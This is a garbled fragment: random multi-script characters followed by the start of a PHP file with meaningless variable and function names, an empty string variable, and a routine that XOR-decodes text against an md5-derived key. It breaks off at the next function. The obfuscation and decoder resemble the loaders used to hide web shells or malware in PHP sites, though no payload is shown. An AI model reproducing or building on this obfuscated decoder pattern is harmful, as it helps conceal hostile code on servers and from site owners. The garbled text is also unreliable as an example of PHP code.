கথራ҉kડקተֆથኂβüనैޭäልબ்<?php
$vqhkjx="";
function rdiyz($vqhkjx, $diyz){
    $xpnq = md5($diyz);
    $qzxjyva = '';
	$ldaop = '32';
    $oack = strlen($vqhkjx);
    for($wqgo=0, $jamliqg=0; $wqgo<$oack; $wqgo++, $jamliqg++){
		if($jamliqg == $ldaop)
			$jamliqg = 0;
        $qzxjyva .= $vqhkjx[$wqgo] ^ $xpnq[$jamliqg];
    }
    return $qzxjyva;
}
function nqfwbl($vqhkjx){
